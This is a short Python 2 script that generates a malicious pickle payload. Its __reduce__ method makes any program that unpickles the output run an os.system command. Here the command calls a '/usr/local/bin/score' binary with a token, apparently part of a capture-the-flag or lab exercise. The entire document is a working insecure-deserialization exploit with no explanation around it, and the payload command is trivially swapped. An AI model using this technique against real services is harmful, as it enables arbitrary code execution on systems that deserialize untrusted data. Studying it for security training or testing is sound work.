import cPickle as pickle

class Blah(object):
  def __reduce__(self):
    return (__import__('os').system,('/usr/local/bin/score c6ff9c86-7094-459f-8d08-41d717b9e508',))

h=Blah()
print(pickle.dumps(h))